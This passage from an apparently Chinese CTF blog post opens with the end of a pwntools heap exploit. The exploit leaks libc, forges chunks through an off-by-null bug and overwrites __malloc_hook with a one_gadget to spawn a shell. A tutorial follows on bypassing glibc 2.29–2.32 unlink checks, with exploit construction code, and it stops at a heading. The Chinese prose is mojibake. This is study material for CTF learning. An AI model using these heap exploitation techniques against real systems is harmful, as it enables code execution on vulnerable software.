class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45206 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4525a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xef9f4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf0897 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;dddd&#x27;</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;eeee&#x27;</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;gggg&#x27;</span>)<br><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>libc_base=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3c3b00</span><br>mlh=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg=libc_base+<span class="hljs-number">0xef9f4</span><br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>log.success(<span class="hljs-built_in">hex</span>(ogg))<br>log.success(<span class="hljs-built_in">hex</span>(mlh))<br><br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0x300</span>))<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">4</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x81</span>)  <span class="hljs-comment">#0x81è®©ç³»ç»ŸçŸ¥é“å‰é¢çš„å †å—æ˜¯è¢«ä½¿ç”¨çš„</span><br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x1f0</span>,payload)<br>free(<span class="hljs-number">2</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(mlh-<span class="hljs-number">0x30</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">1</span>,payload)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(ogg))<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h1 id="glibc2-29-2-32-off-by-null-bypass"><a href="#glibc2-29-2-32-off-by-null-bypass" class="headerlink" title="glibc2.29~2.32 off by null bypass"></a>glibc2.29~2.32 off by null bypass</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è§‚å…‰æµè§ˆå¤§ä½¬åšå®¢æ—¶ï¼Œå‘ç°å¤§ä½¬ç«Ÿç„¶æ•´ç†äº†ä¸€ç¯‡glibc2.29~2.32 off by null bypassï¼Œå¦‚è·è‡³å®ï¼Œå­¦ä¹ ä¸ºæ•¬ï¼</p>
<p>åšå®¢åœ°å€ï¼š<a href="http://blog.wjhwjhn.com/archives/193/">http://blog.wjhwjhn.com/archives/193/</a></p>
<h2 id="ä»‹ç»-2"><a href="#ä»‹ç»-2" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>åœ¨ glibc2.29 ä»¥ä¸Šç‰ˆæœ¬ï¼Œglibc åœ¨ unlink å†…åŠ å…¥äº† prevsize checkï¼Œè€Œé€šè¿‡ off by null æ¼æ´æ ¹æœ¬æ— æ³•ç›´æ¥ä¿®æ”¹æ­£å¸¸ chunk çš„ sizeï¼Œå¯¼è‡´æƒ³è¦ é€šè¿‡unlink åˆ¶é€ å‡ºå †å—é‡å å˜å¾—å‡ ä¹ä¸å¯èƒ½ã€‚å½“ç„¶ off by one æ˜¯æ²¡æœ‰å½±å“çš„ã€‚æ‰€ä»¥åœ¨ 2.29 ä»¥ä¸Šç‰ˆæœ¬ï¼Œoff by null çš„åˆ©ç”¨åªæœ‰å”¯ä¸€çš„æ–¹æ³• â€”â€” ä¼ªé€  FD å’Œ BK</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* consolidate backward */</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">prev_inuse</span>(p)) &#123;<br>  prevsize = <span class="hljs-built_in">prev_size</span> (p);<br>  size += prevsize;<br>  p = <span class="hljs-built_in">chunk_at_offset</span>(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (<span class="hljs-built_in">chunksize</span>(p) != prevsize))<br>    <span class="hljs-built_in">malloc_printerr</span> (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>  <span class="hljs-built_in">unlink_chunk</span> (av, p);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä¼ªé€  FD å’Œ BK éœ€è¦ç»•è¿‡ä¸‹é¢çš„æ£€æµ‹æ‰è¡Œ </p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))      <br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br></code></pre></td></tr></table></figure>

<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="no-pie"><a href="#no-pie" class="headerlink" title="no pie"></a>no pie</h3><p>è¿™ç§æƒ…å†µå…¶å®å°±æ˜¯æˆ‘ä¹‹å‰å†™è¿‡çš„unlink attackï¼ŒåŠ«æŒç¨‹åºä¸­ç”¨äº<strong>å‚¨å­˜å †å—æŒ‡é’ˆçš„æ•°ç»„</strong>ï¼Œä»è€Œè¾¾æˆä»»æ„åœ°å€å†™çš„ç›®çš„ã€‚è¯¦ç»†æƒ…å†µè¯·ç§»æ­¥åˆ°è¯¥ç¯‡åšå®¢ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°</p>
<h3 id="æ‹¥æœ‰å †åœ°å€"><a href="#æ‹¥æœ‰å †åœ°å€" class="headerlink" title="æ‹¥æœ‰å †åœ°å€"></a>æ‹¥æœ‰å †åœ°å€</h3><p><img src="/2021/07/20/2021-07-26-offbyone&null/0ce506d87fdbbe100ec80d1bc6f87725.png" alt="å›¾ç‰‡"></p>
<p>æˆ‘ä»¬å¯ä»¥ä»¿ç…§ä¸Šé¢çš„æƒ…å†µï¼Œåœ¨ä¸€ä¸ªå¯ä»¥å†™å…¥å†…å®¹çš„å †å—æ¯”å¦‚0x20çš„ä½ç½®ï¼ˆptrï¼‰ä¸Šå¡«å…¥å°†è¦unlinkçš„å †å—åœ°å€ï¼Œç„¶ååœ¨å°†è¦unlinkçš„å †å—çš„ fdï¼Œbk æŒ‡é’ˆä¸Šå†™å…¥<code>ptr-0x18</code>ï¼Œ<code>ptr-0x10</code>å³å¯ç»•è¿‡æ£€æµ‹ï¼Œå®ç°unlink</p>
<h3 id="æ— æ³•æ³„éœ²å †åœ°å€"><a href="#æ— æ³•æ³„éœ²å †åœ°å€" class="headerlink" title="æ— æ³•æ³„éœ²å †åœ°å€"></a>æ— æ³•æ³„éœ²å †åœ°å€</h3><p>ä¸å¯æ³„éœ²å †åœ°å€çš„å„ç§æ–¹æ³•å½’æ ¹ç»“åº•éƒ½æ˜¯é€šè¿‡<strong>éƒ¨åˆ†å†™å…¥</strong>å’Œ<strong>å„ç§å †ç®¡ç†å™¨çš„æ€§è´¨</strong>æ¥æ”¹å†™å‡ºæƒ³è¦æŒ‡å‘çš„å †å—åœ°å€ä»è€Œç»•è¿‡æ£€æµ‹</p>
<h4 id="ä¸€ã€åœ¨å€Ÿç”¨large-chunkä¸Šçš„åƒåœ¾æ•°æ®"><a href="#ä¸€ã€åœ¨å€Ÿç”¨large-chunkä¸Šçš„åƒåœ¾æ•°æ®" class="headerlink" title="ä¸€ã€åœ¨å€Ÿç”¨large chunkä¸Šçš„åƒåœ¾æ•°æ®"></a>ä¸€ã€åœ¨å€Ÿç”¨large chunkä¸Šçš„åƒåœ¾æ•°æ®</h4><p>å½“åªæœ‰ä¸€ä¸ªlarge chunkåœ¨ bin é“¾ä¸Šæ—¶ï¼Œfd_nextsize å’Œ bk_nextsize æ˜¯å­˜æ”¾large chunkæœ¬èº«çš„åœ°å€ã€‚æˆ‘ä»¬å°±æ˜¯è¦åˆ©ç”¨è¿™ä¸¤ä¸ªæ®‹ä½™çš„åƒåœ¾çš„æ•°æ®ï¼ŒæŠŠè¿™ä¸¤ä¸ªæ•°æ®ä½œä¸ºæˆ‘ä»¬è¦æ„é€ çš„ fake chunk çš„ fd bk æŒ‡é’ˆã€‚</p>
<p>ç„¶åå¤§ä½¬åšå®¢æ²¡æœ‰ä»‹ç»çš„å¾ˆæ¸…æ¥šï¼ˆå¤§ä½¬éƒ½æ˜¯è¿™æ ·çš„ï¼‰ï¼Œæˆ‘è¿™è¾¹ä¼šæ›´åŠ è¯¦ç»†çš„ä»‹ç»å…¶ä¸­çš„ç»†èŠ‚</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20211001161409749.png" alt="image-20211001161409749"></p>
<p>é¦–å…ˆè¿™æ˜¯ large chunk çš„ç»“æ„</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20211001164643331.png"></p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20211001161853438.png" alt="image-20211001161853438"></p>
<p>è¿™æ˜¯ç»è¿‡ä¼ªé€ åçš„ large chunk ä»¥åŠæˆ‘ä»¬è¦ç”¨å¾—ä¸€ä¸ªå¯ä»¥è¢«æ§åˆ¶çš„ chunk ï¼Œé¦–å…ˆä»0x10å¼€å§‹ä½œä¸º fake chunk çš„å †å¤´å¼€å§‹å¸ƒç½®ï¼Œé€šè¿‡éƒ¨åˆ†å†™æŠŠ fake fdæŒ‡é’ˆæ”¹ä¸º chunk çš„åœ°å€ï¼ŒåŒæ—¶éƒ¨åˆ†å†™å…¥ä¿®æ”¹ chunk bk æŒ‡é’ˆä¸º fake chunkï¼Œä»è€Œç»•è¿‡ç¬¬ä¸€ä¸ªæ£€æŸ¥ FD-&gt;bk == p</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯ç»•è¿‡ç¬¬äºŒä¸ªæ£€æŸ¥ BK-&gt;fd == pï¼Œæˆ‘ä»¬åˆ©ç”¨fastbinçš„ç‰¹æ€§ï¼šä¼šåœ¨fdæŒ‡é’ˆç•™ä¸‹å‰ä¸€å—çš„å †åœ°å€ï¼Œåœ¨ large chunk çš„ fd æŒ‡é’ˆä½ç½®å†™å…¥å †åœ°å€ï¼Œç„¶åå€Ÿç€éƒ¨åˆ†å†™å…¥ä¿®æ”¹ä¸º fake chunk addr - 0x10ï¼Œå®Œæˆç¬¬äºŒä¸ªæ£€æŸ¥çš„ç»•è¿‡ã€‚</p>
<p>æˆ‘ä¹‹æ‰€ä»¥æ²¡æœ‰å†é‡è¿°tcacheæ˜¯å› ä¸ºï¼šåœ¨æ„çš„åœ°æ–¹æ˜¯glibc 2.29ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œä»¥ä¸‹çš„ç‰ˆæœ¬æ²¡å¿…è¦ä½¿ç”¨è¿™ä¹ˆéº»çƒ¦çš„åŠæ³•æ„é€ ï¼Œè€Œå†glibc 2.29ä»¥ä¸Šçš„ç‰ˆæœ¬åŠ å…¥çš„keyå­—æ®µä¼šç ´åbkæŒ‡é’ˆçš„å†…å®¹</p>
<p>ä¿®æ”¹æ–¹æ³•ä¸ºï¼šç„¶åå…ˆé‡Šæ”¾ aï¼Œå†é‡Šæ”¾ largebin chunkï¼Œè¿™æ—¶å€™å† largebin chunk + 0x10 çš„ä½ç½®å°±ä¼šæœ‰ä¸€ä¸ª a çš„æŒ‡é’ˆã€‚æˆ‘ä»¬å†ç”¨éƒ¨åˆ†å†™å…¥å°†æŒ‡é’ˆæ”¹å†™æˆ largebin chunk + 0x10 çš„åœ°å€ã€‚</p>
<p>ä½†æ˜¯è¿™ç§æ–¹æ³•ï¼Œæœ‰ç‚¹è¿‡äºç¹çã€‚ã€‚ã€‚å¹¶ä¸”ä¸å¤ªç°å®ï¼Œéœ€è¦fastchunk å’Œlarge chunkï¼Œç”³è¯·æ¬¡æ•°å¤§å¤šé¢˜ç›®ä¸ç»™è¿™ä¹ˆå¤šçš„ã€‚äº†è§£å³å¯</p>
<h4 id="äºŒã€åˆ©ç”¨-unsorted-bin-å’Œ-large-bin-é“¾æœºåˆ¶"><a href="#äºŒã€åˆ©ç”¨-unsorted-bin-å’Œ-large-bin-é“¾æœºåˆ¶" class="headerlink" title="äºŒã€åˆ©ç”¨ unsorted bin å’Œ large bin é“¾æœºåˆ¶"></a>äºŒã€åˆ©ç”¨ unsorted bin å’Œ large bin é“¾æœºåˆ¶</h4><p>è¿™éƒ¨åˆ†å†…å®¹å¦‚æœåˆ©ç”¨å¾—å½“ï¼Œå¯ä»¥åœ¨é¢˜ç›®çš„è‹›åˆ»çš„æ¡ä»¶ä¸‹ï¼ˆå¦‚ä¼šåœ¨æœ«å°¾å†™å…¥ x00 ç­‰â€¦ï¼‰ä¹Ÿå¯ä»¥æ— éœ€çˆ†ç ´ä¼ªé€ å †å—ï¼Œç€é‡å­¦ä¹ ï¼ŒæŒæ¡</p>
<p>ä»¥ä¸‹å†…å®¹å…¨éƒ¨å¤åˆ¶è‡ªå¤§ä½¬åšå®¢ï¼š</p>
<h5 id="åŸºæœ¬æ€è·¯"><a href="#åŸºæœ¬æ€è·¯" class="headerlink" title="åŸºæœ¬æ€è·¯"></a>åŸºæœ¬æ€è·¯</h5><h5 id="1-åœ¨-fd-å’Œ-bk-å†™å †åœ°å€"><a href="#1-åœ¨-fd-å’Œ-bk-å†™å †åœ°å€" class="headerlink" title="1. åœ¨ fd å’Œ bk å†™å †åœ°å€"></a>1. åœ¨ fd å’Œ bk å†™å †åœ°å€</h5><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå †å— 0x55555555bc00 æ˜¯æˆ‘ä»¬è¦ç”¨äºæ„é€ çš„å †å—åœ°å€ã€‚</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/4d011f51c99d6a925d5ee5c25aabdadd.png" alt="å›¾ç‰‡"></p>
<p>é€šè¿‡ unsorted bin é“¾è¡¨æˆ‘ä»¬è®©è¿™ä¸ªå †å—çš„ fd å’Œ bk éƒ½å†™äº†ä¸€ä¸ªå †åœ°å€</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/dbe25454747c3469ac4c83297c0536c6.png" alt="å›¾ç‰‡"></p>
<h6 id="æ„é€ å›¾ï¼š"><a href="#æ„é€ å›¾ï¼š" class="headerlink" title="æ„é€ å›¾ï¼š"></a>æ„é€ å›¾ï¼š</h6><p><img src="/2021/07/20/2021-07-26-offbyone&null/c4c7f62c37e418f3d4fc252601150155.png" alt="å›¾ç‰‡"></p>
<p>å…¶ä¸­è¾…åŠ©å †å—çš„ä½œç”¨åœ¨ä¹‹åä¼šæåŠ</p>
<h6 id="æ„é€ ä»£ç ï¼š"><a href="#æ„é€ ä»£ç ï¼š" class="headerlink" title="æ„é€ ä»£ç ï¼š"></a><strong>æ„é€ ä»£ç ï¼š</strong></h6><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#0 fd</span><br>add(<span class="hljs-number">0x108</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x438</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x108</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x428</span>) <span class="hljs-comment"># 5 bk </span><br>add(<span class="hljs-number">0x108</span>) <span class="hljs-comment"># 6</span><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure>



<h3 id="2-åœ¨ä¼ªé€ å †å—é™„è¿‘ç”³è¯·å †å—"><a href="#2-åœ¨ä¼ªé€ å †å—é™„è¿‘ç”³è¯·å †å—" class="headerlink" title="2. åœ¨ä¼ªé€ å †å—é™„è¿‘ç”³è¯·å †å—"></a>2. åœ¨ä¼ªé€ å †å—é™„è¿‘ç”³è¯·å †å—</h3><p>ç”±äºæˆ‘ä»¬è¦é€šè¿‡éƒ¨åˆ†å†™å…¥çš„æ–¹æ³•æ¥ç»•è¿‡æ£€æµ‹ï¼Œè€Œåœ¨å †ç©ºé—´ä¸­ï¼Œåªæœ‰ä½ä¸‰å­—èŠ‚æ˜¯å›ºå®šçš„ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬ä¸ºäº†é€ƒé¿çˆ†ç ´ï¼Œå¸Œæœ›èƒ½å¤Ÿæ‰¾åˆ°åªéœ€è¦è¦†ç›–æœ€ä½ä¸€å­—èŠ‚å°±å¯ä»¥ä¿®æ”¹æˆ fake chunk çš„åœ°å€ï¼Œäºæ˜¯æˆ‘ä»¬åº”è¯¥åˆ©ç”¨åœ¨ fake å †å—é™„è¿‘ 0x100 å†…çš„å †å—æ¥ä½œä¸ºè¾…åŠ©å †å—å†™åœ°å€ï¼Œ<strong>ä¹‹å‰ç”³è¯·çš„è¾…åŠ©å †å—å°±æ˜¯èµ·åˆ°äº†è¿™ä¸ªä½œç”¨ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå †å—æ¥è¿›è¡Œé‡åˆ†é…ï¼Œä½¿å¾—åˆ†é…çš„åœ°å€éå¸¸è´´è¿‘åˆ©ç”¨å †å—</strong>ã€‚</p>
<h4 id="æ„é€ å›¾ï¼š-1"><a href="#æ„é€ å›¾ï¼š-1" class="headerlink" title="æ„é€ å›¾ï¼š"></a>æ„é€ å›¾ï¼š</h4><p><img src="/2021/07/20/2021-07-26-offbyone&null/8940fc1f7a2579bed0c78b865df9a6c9.png" alt="å›¾ç‰‡"></p>
<p>å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬å…ˆè®©è¾…åŠ©å †å—å’Œåˆ©ç”¨å †å—åˆå¹¶ä¹‹åå†å¯¹ç©ºé—´è¿›è¡Œé‡æ–°åˆ†é…ï¼Œä½¿å¾—å †å— 2 æ°å¥½å¯ä»¥è¦†ç›–åˆ°ä¹‹å‰åˆ©ç”¨å †å—çš„ sizeï¼Œä¸”å †å— 3 çš„ 0x55555555bc20ï¼Œååˆ†è´´è¿‘ä¹‹å‰ 0x55555555bc00ï¼Œåªéœ€è¦æŠ¹å»æœ€ä½ä¸€å­—èŠ‚å³å¯ã€‚</p>
<h4 id="æ„é€ ä»£ç ï¼š-1"><a href="#æ„é€ ä»£ç ï¼š-1" class="headerlink" title="æ„é€ ä»£ç ï¼š"></a>æ„é€ ä»£ç ï¼š</h4><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">delete(<span class="hljs-number">2</span>) <span class="hljs-comment">#2 &amp; 3 unlink</span><br>add(<span class="hljs-number">0x438</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x418</span> + p64(<span class="hljs-number">0xA91</span>))  <span class="hljs-comment"># 0 set size</span><br>add(<span class="hljs-number">0x418</span>)  <span class="hljs-comment"># 2 c20</span><br>add(<span class="hljs-number">0x428</span>)  <span class="hljs-comment"># 3 bk 150</span><br>add(<span class="hljs-number">0x418</span>)  <span class="hljs-comment"># 5 fd 2b0</span><br></code></pre></td></tr></table></figure>



<h4 id="æ³¨æ„ï¼š"><a href="#æ³¨æ„ï¼š" class="headerlink" title="æ³¨æ„ï¼š"></a>æ³¨æ„ï¼š</h4><p>åˆ†é…å®Œæˆä¹‹åï¼Œæˆ‘ä»¬å†æŠŠå…¨éƒ¨å †å—ç”³è¯·å›æ¥ï¼Œè¿™å¯èƒ½å¹¶ä¸æ˜¯æ­¥éª¤æœ€å°‘çš„åšæ³•ï¼Œä½†æ˜¯å…¨éƒ¨ç”³è¯·å›æ¥å¯ä»¥ä½¿å¾—æ“ä½œæœ‰æ¡ç†ï¼Œä½¿å¾—æˆ‘ä»¬æ„é€ è¿‡ç¨‹ä¸­å‡ºç°çš„é—®é¢˜å‡å°‘ã€‚</p>
<h3 id="3-ä¿®å¤-fake-fd"><a href="#3-ä¿®å¤-fake-fd" class="headerlink" title="3. ä¿®å¤ fake fd"></a>3. ä¿®å¤ fake fd</h3><h4 id="ä¿®å¤æ€è·¯ï¼š"><a href="#ä¿®å¤æ€è·¯ï¼š" class="headerlink" title="ä¿®å¤æ€è·¯ï¼š"></a>ä¿®å¤æ€è·¯ï¼š</h4><p>æˆ‘ä»¬åœ¨ä¹‹å‰çš„çŠ¶æ€ä¸‹ï¼Œå…ˆåˆ é™¤ <strong>fake-&gt;FD å †å—</strong>ï¼Œå†åˆ é™¤<strong>é‡åˆ†é…å †å— 2ï¼ˆè¾…åŠ©å †å—ï¼‰</strong>ã€‚æˆ‘ä»¬å°±å¯ä»¥åœ¨ <strong>fake-&gt;FD å †å—çš„ BK ä½ç½®</strong>å†™å…¥ä¸€ä¸ª<strong>é‡åˆ†é…å †å— 2ï¼ˆè¾…åŠ©å †å—ï¼‰</strong>çš„å€¼</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/8926f053ddc0e4cc4366e19babb9f47e.png" alt="å›¾ç‰‡"></p>
<p>å†ç”¨éƒ¨åˆ†å†™å…¥ä¸€å­—èŠ‚æ¥è¦†ç›–ï¼Œè¦†ç›–æˆ<strong>åˆ©ç”¨å †å—</strong>çš„æŒ‡é’ˆ</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/400f4af89ed8abec85d3e1567007d7b2.png" alt="å›¾ç‰‡"></p>
<p>æœ€åå†æŠŠ bc20 è¿™ä¸ªè¾…åŠ©å †å—ç”³è¯·å›æ¥ï¼Œæ–¹ä¾¿ä¸‹ä¸€æ¬¡ä½¿ç”¨ã€‚</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/e9f7b1f6bde94a7ee9b2816e4da7ea0e.png" alt="å›¾ç‰‡"></p>
<h4 id="æ„é€ ä»£ç ï¼š-2"><a href="#æ„é€ ä»£ç ï¼š-2" class="headerlink" title="æ„é€ ä»£ç ï¼š"></a>æ„é€ ä»£ç ï¼š</h4><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># partial overwrite fd -&gt; bk by unsorted bin list</span><br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x418</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">9</span>)  <span class="hljs-comment"># 2 partial overwrite bk</span><br>add(<span class="hljs-number">0x418</span>)  <span class="hljs-comment"># 5 c20</span><br></code></pre></td></tr></table></figure>



<h5 id="4-ä¿®å¤-fake-bk"><a href="#4-ä¿®å¤-fake-bk" class="headerlink" title="4. ä¿®å¤ fake bk"></a>4. ä¿®å¤ fake bk</h5><h6 id="ä¿®å¤æ€è·¯ï¼š-1"><a href="#ä¿®å¤æ€è·¯ï¼š-1" class="headerlink" title="ä¿®å¤æ€è·¯ï¼š"></a>ä¿®å¤æ€è·¯ï¼š</h6><p>åœ¨æˆ‘ç¤ºä¾‹çš„è¿™é“é¢˜ä¸‹ï¼Œä½¿ç”¨ unsorted bin æ¥ä¿®å¤å¦å¤– <strong>fake bk</strong> æ˜¯å¾ˆéš¾çš„ï¼Œè¿™æ˜¯å› ä¸ºè¿™é“é¢˜å¦‚æœè¦è¿› unsorted bin çš„å †å—ï¼Œsize å¤§å°è¦å¤§äºç­‰äº 0x418ï¼Œè€Œè¿™ä¸ª size æ˜¯åœ¨ largebin èŒƒå›´å†…çš„ã€‚</p>
<p>æ‰€ä»¥å¦‚æœæˆ‘ä½¿ç”¨ä¸åŒ size ç”³è¯·çš„æ–¹æ³•ï¼Œé”™å¼€<strong>è¾…åŠ©å †å—</strong>å»ç›´æ¥ç”³è¯· <strong>fake bk å †å—ï¼ˆå› ä¸ºå¦‚æœè¦åœ¨ fake bk-&gt;fd çš„ä½ç½®å†™å †å€¼ï¼Œé‚£ä¹ˆåœ¨éå†çš„æ—¶å€™ä¸€å®šæ˜¯å…ˆéå†åˆ°è¾…åŠ©å †å—ï¼Œæ‰€ä»¥éœ€è¦é”™å¼€è¾…åŠ©å †å—å…ˆå»ç”³è¯· fake bk å †å—ï¼Œæˆ‘æƒ³åˆ°çš„æ–¹æ³•å°±æ˜¯ç”³è¯·ä¸€ä¸ªè¾…åŠ©å †å—æ— æ³•æä¾›çš„ size æ¥é”™å¼€ã€‚ä½†äº‹å®ä¸Šï¼Œé”™å¼€è¾…åŠ©å †å—ä¼šä½¿å¾—è¾…åŠ©å †å—è¿›å…¥ largebin ä¸­ï¼Œä»è€Œä¸åŸæ¥çš„ fake bk æ–­é“¾ï¼Œè¿™æ ·åŸæ¥å·²ç»å†™ä¸Šçš„å †åœ°å€ä¹Ÿä¸å¤å­˜åœ¨ï¼‰</strong>ï¼Œå› ä¸ºè¿™ä¸ªåŸå› æ‰€ä»¥è¿™éƒ¨åˆ†æˆ‘è¦å…ˆè®©å †å—è¿›å…¥ largebin å†ç”¨<strong>ç±»ä¼¼äºä¿®å¤ fake fd çš„æ–¹æ³•è¿›è¡Œä¿®å¤ã€‚</strong></p>
<p>å…ˆåˆ é™¤<strong>é‡åˆ†é…å †å— 2ï¼ˆè¾…åŠ©å †å—ï¼‰</strong>ï¼Œå†åˆ é™¤ <strong>fake-&gt;BK å †å—</strong>ï¼ˆæ³¨æ„ï¼šè¿™é‡Œå’Œä¸Šé¢é¡ºåºä¸ä¸€è‡´ï¼Œè¿™æ˜¯å› ä¸ºæƒ³è¦å†™å…¥å †å—åœ°å€çš„ä½ç½®ä¸ä¸€è‡´ï¼‰</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/7b03f181d1dbc20c0b2c7d698b6d8b38.png" alt="å›¾ç‰‡"></p>
<p>å†è®©å †å—è¿›å…¥åˆ° largebin ä¸­</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/0d5737399f40b84abd6d99d282c0f2c8.png" alt="å›¾ç‰‡"></p>
<p>å†ä½¿ç”¨éƒ¨åˆ†å†™å…¥æ¢å¤ <strong>fake bk</strong></p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/e39634201bd2beefba9ec4e3821920e6.png" alt="å›¾ç‰‡"></p>
<p>æ„é€ ä»£ç ï¼š</p>
